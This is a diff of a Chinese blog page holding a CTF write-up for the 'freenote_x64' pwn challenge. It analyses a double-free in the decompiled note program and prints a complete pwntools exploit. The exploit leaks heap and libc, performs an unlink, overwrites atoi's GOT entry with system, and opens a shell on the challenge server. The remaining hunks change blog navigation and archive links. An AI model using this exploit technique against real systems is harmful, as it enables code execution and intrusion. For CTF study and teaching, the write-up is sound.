@@ -401,34 +401,28 @@ height:50vh;
 <li>大概结构体如下图</li>
 </ul>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span></span><br><span class="line"><span class="number">00000000</span> headptr         struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1810</span>, align=<span class="number">0x8</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> max             dq ?</span><br><span class="line"><span class="number">00000008</span> count           dq ?</span><br><span class="line"><span class="number">00000010</span> nodelist        note <span class="number">256</span> dup(?)</span><br><span class="line"><span class="number">00001810</span> headptr         ends</span><br><span class="line"><span class="number">00001810</span></span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>note结构体如下</li>
 </ul>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> note            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, align=<span class="number">0x8</span>, mappedto_7)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: headptr/r</span><br><span class="line"><span class="number">00000000</span> inuse           dq ?</span><br><span class="line"><span class="number">00000008</span> size            dq ?</span><br><span class="line"><span class="number">00000010</span> data            dq ?</span><br><span class="line"><span class="number">00000018</span> note            ends</span><br><span class="line"><span class="number">00000018</span></span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>经过整理以后,可以看出来程序一开始初始化了256个note结构体,指针置空</li>
 </ul>
 <h1 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h1><h2 id="new函数"><a href="#new函数" class="headerlink" title="new函数"></a>new函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( head-&gt;count &lt; head-&gt;max )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = head-&gt;max;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= head-&gt;max )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !head-&gt;nodelist[i].inuse )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Length of new note: "</span>);</span><br><span class="line">        size = retint();</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( size &gt; <span class="number">4096</span> )</span><br><span class="line">            size = <span class="number">4096</span>;</span><br><span class="line">          buf = <span class="built_in">malloc</span>((<span class="number">128</span> - size % <span class="number">128</span>) size);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Enter your note: "</span>);</span><br><span class="line">          mread1(buf, size);</span><br><span class="line">          head-&gt;nodelist[i].inuse = <span class="number">1L</span>L;</span><br><span class="line">          head-&gt;nodelist[i].size = size;</span><br><span class="line">          head-&gt;nodelist[i].data = buf;</span><br><span class="line">          ++head-&gt;count;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Invalid length!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"Unable to create new note."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>整理过结构体以后,程序逻辑就很清晰了,new函数是从前到后遍历chunklist,当inuse为0的时候,在那个堆块malloc了note的空间,注意的是,size是不可任意malloc的,因为设置了自动对齐的运算,size大小只能是128*n (n &gt; 0)</li>
 <li>这就导致了我们无法直接申请fastbin</li>
 <li>还有程序自己实现了read函数,输入size后必须输入满足你的size才能结束输入循环</li>
 </ul>
 <h2 id="list函数"><a href="#list函数" class="headerlink" title="list函数"></a>list函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">list</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( head-&gt;count &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"You need to create some new notes first."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = head-&gt;max;</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= head-&gt;max )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( head-&gt;nodelist[i].inuse == <span class="number">1</span> )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d. %s\n"</span>, i, head-&gt;nodelist[i].data);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>打印当前所有inuse为1的堆块</li>
 </ul>
 <h2 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  headptr *v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Note number: "</span>);</span><br><span class="line">  v3 = retint();</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt;= head-&gt;max || head-&gt;nodelist[v3].inuse != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Length of note: "</span>);</span><br><span class="line">  v2 = retint();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid length!"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">    v2 = <span class="number">4096</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != head-&gt;nodelist[v3].size )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = head;</span><br><span class="line">    v1-&gt;nodelist[v3].data = <span class="built_in">realloc</span>(head-&gt;nodelist[v3].data, (<span class="number">128</span> - v2 % <span class="number">128</span>) v2);<span class="comment">// 0 128 256</span></span><br><span class="line">    head-&gt;nodelist[v3].size = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter your note: "</span>);</span><br><span class="line">  mread1(head-&gt;nodelist[v3].data, v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>这个edit函数并没有限制编辑的次数,而且要注意的是,当size不一样的时候,程序会调用realloc函数</li>
 </ul>
 <h2 id="del函数"><a href="#del函数" class="headerlink" title="del函数"></a>del函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( head-&gt;count &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No notes yet."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Note number: "</span>);</span><br><span class="line">  v1 = retint();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= head-&gt;max )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid number!"</span>);</span><br><span class="line">  --head-&gt;count;</span><br><span class="line">  head-&gt;nodelist[v1].inuse = <span class="number">0L</span>L;               <span class="comment">// 未check是否inuse 任意次数free</span></span><br><span class="line">  head-&gt;nodelist[v1].size = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">free</span>(head-&gt;nodelist[v1].data);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>最短的函数之一,也是漏洞点的所在</li>
 <li>程序并没有check堆块是否inuse,而且free后指针没有置空,所以就导致了我们可以通过double free来进行攻击</li>
@@ -444,13 +438,11 @@ height:50vh;
 <li>三次malloc(128)以后内存依次free后内存中应该是下面的样子</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-----+--------------------</span><br><span class="line">0x00 | head   size</span><br><span class="line">0x10 | data   data</span><br><span class="line">.... | data   data</span><br><span class="line">0x80 | data   data</span><br><span class="line">-----+--------------------</span><br><span class="line">0x90 | head   size</span><br><span class="line">0xa0 | data   data</span><br><span class="line">.... | data   data</span><br><span class="line">0x110| data   data</span><br><span class="line">-----+--------------------</span><br><span class="line">0x120| head   size</span><br><span class="line">0x130| data   data</span><br><span class="line">.... | data   data</span><br><span class="line">0x1a0| data   data</span><br><span class="line">--------------------------</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>之后编辑堆块构造unlink</li>
 <li>放出完整exp</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9886</span>)</span><br><span class="line"><span class="comment"># r = process("./freenote_x64",env=&#123;'LD_PRELOAD':'./libc-2.19.so'&#125;)</span></span><br><span class="line">got_atoi = <span class="number">0x602070</span></span><br><span class="line">libc_mainarena = <span class="number">0x3BE760</span></span><br><span class="line">libc_system = <span class="number">0x46590</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"choice: "</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(text)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"choice: "</span>,<span class="string">"2"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"new note: "</span>,str(len(text)))</span><br><span class="line">    r.sendafter(<span class="string">"your note: "</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,text)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"choice: "</span>,<span class="string">"3"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Note number: "</span>,str(index))</span><br><span class="line">    r.sendlineafter(<span class="string">"Length of note: "</span>,str(len(text)))</span><br><span class="line">    r.sendafter(<span class="string">"your note: "</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"choice: "</span>,<span class="string">"4"</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">"Note number: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"start"</span></span><br><span class="line">    new(<span class="string">"1"</span>)</span><br><span class="line">    new(<span class="string">"2"</span>)</span><br><span class="line">    new(<span class="string">"3"</span>)</span><br><span class="line">    new(<span class="string">"4"</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    new(<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">    new(<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">    show()</span><br><span class="line">    r.recv(<span class="number">11</span>)</span><br><span class="line">    s = r.recv(<span class="number">4</span>)</span><br><span class="line">    heap_base = u64(s+<span class="string">'\x00'</span>*<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"heap_base : 0x%x"</span>%heap_base</span><br><span class="line">    r.recv(<span class="number">17</span>)</span><br><span class="line">    s = r.recv(<span class="number">6</span>)</span><br><span class="line">    main_arena = u64(s+<span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"mainarena : 0x%x"</span>%main_arena</span><br><span class="line">    chunklist0 = heap_base - <span class="number">0x1910</span></span><br><span class="line">    <span class="comment">#del</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#unlink</span></span><br><span class="line">    new(<span class="string">"1"</span>)</span><br><span class="line">    new(<span class="string">"2"</span>)</span><br><span class="line">    new(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    payload += <span class="string">"a"</span>*<span class="number">8</span> + p64(<span class="number">0x81</span>)</span><br><span class="line">    payload += p64(chunklist0<span class="number">-0x18</span>) + p64(chunklist0<span class="number">-0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">0x0</span>) * <span class="number">2</span> * <span class="number">6</span></span><br><span class="line">    payload += p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">    payload += p64(<span class="number">0x0</span>) * <span class="number">2</span> * <span class="number">8</span></span><br><span class="line">    payload += <span class="string">"a"</span>*<span class="number">8</span> + p64(<span class="number">0x91</span>)</span><br><span class="line">    new(payload)</span><br><span class="line">    free(<span class="number">1</span>)   <span class="comment">#unlink  ptr[0] -&gt; &amp;ptr[0] - 0x18</span></span><br><span class="line">    <span class="comment">#attack</span></span><br><span class="line">    libc_base = main_arena - <span class="number">88</span> - libc_mainarena</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base : 0x%x"</span>%libc_base</span><br><span class="line">    system = libc_base + libc_system</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"sytem_add : 0x%x"</span>%system</span><br><span class="line">    <span class="comment">#getshell</span></span><br><span class="line">    payload1 = p64(<span class="number">0x1</span>) + p64(<span class="number">0x1</span>)</span><br><span class="line">    payload1 += p64(<span class="number">0x120</span>) + p64(chunklist0<span class="number">-0x18</span>)</span><br><span class="line">    payload1 += p64(<span class="number">0x1</span>) + p64(<span class="number">8</span>) + p64(got_atoi)</span><br><span class="line">    payload1 += p64(<span class="number">0</span>)*<span class="number">2</span> * <span class="number">14</span> + p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(len(payload1))</span><br><span class="line">    edit(<span class="number">0</span>,payload1)</span><br><span class="line">    edit(<span class="number">1</span>,p64(system))</span><br><span class="line">    r.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
-
 <blockquote>
 <p>Your choice: $ ls<br>$ ls<br>flag<br>freenote_x64<br>$ cat flag<br>CTF{de7effd8864<strong><strong>**</strong></strong>c}</p>
 </blockquote>
@@ -471,16 +463,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href= "/1970/01/01/maze/" title= "cis2016-re300-maze">
-                    <div class="nextTitle">cis2016-re300-maze</div>
+                <a href= "/1970/01/01/juckcode/" title= "上海市ctf-re200-juckcode">
+                    <div class="nextTitle">上海市ctf-re200-juckcode</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/1970/01/01/iscc安卓逆向/" title= "ISCC 决赛 android 1000">
-                    <div class="prevTitle">ISCC 决赛 android 1000</div>
+                <a href= "/1970/01/01/maze/" title= "cis2016-re300-maze">
+                    <div class="prevTitle">cis2016-re300-maze</div>
                 </a>
             
         </li>
@@ -2645,9 +2637,24 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 67
+        Total : 68
         </div>
         <!-- search  -->
         
@@ -2764,17 +2771,32 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/sudu/" >2017国赛re200 填数游戏</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/windows-c++/" >windows</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/cve-2015-7504/" >CVE-2015-7504 CVE-2015-5165QEMU虚拟机逃逸漏洞分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/windows/" >windows反调试总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/docker/" >docker</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/RE/" >2018国赛逆向</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/suanfa/" >算法设计</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/xnuca-final/" >X-NUCA 2018个人赛/决赛PWN</a>
         </li>
     
     
@@ -2784,17 +2806,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/xnuca/" >X-NUCA逆向部分题解</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/hexo/" >hexo配置</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/二进制手的Web路SQL0/" >二进制手的Web路（sql注入篇</a>
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/xnuca-final/" >X-NUCA 2018个人赛/决赛PWN</a>
         </li>
     
     
@@ -2809,132 +2821,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/kctf2019-q1/" >kctf2019-晋级赛Q1</a>
+            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/javascript0x1/" >javascript 0x00</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/二进制手的Web路SQL1/" >二进制手的Web路（sql注入篇</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/angr/" >符号执行</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/二进制手的Web路SQL2/" >二进制手的Web路 （sql注入篇</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/pe-elf/" >pe-elf文件结构解析</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/二进制选手的Web路(WhaleCTF web部分writepu/" >二进制手的WEB路（WhaleCTF web部分writeup</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/qctf-mips/" >qctf-mips</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/PE文件头/" >PE文件格式</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/RingZer0 Authenticator/" >RingZer0 Authenticator</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/windows-c++/" >windows</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/Reversing.kr--replace/" >初试程序自修改</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/函数调用约定/" >Calling Convention</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/Reversing.kr--position&hateintel/" >Position&hateintel&Wrong byte!</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/汇编入门/" >CTF二进制总结0X03</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/DLL注入0x1/" >初试windows消息钩取</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/深入浅出密码学读书笔记/" >深入浅出密码学读书笔记</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/tls/" >hctf2018-部分逆向wp(Spiral是真的做不来)</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/看雪ctf4/" >2018看雪ctf第四题-密界寻踪</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/NUST/" >南理校赛二进制wp</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/逆向工程核心原理笔记/" >Reversing-engineering</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/01</span><a class="archive-post-title" href= "/1970/01/01/wcyvm/" >WcyVM</a>
-        </li>
-    
-    
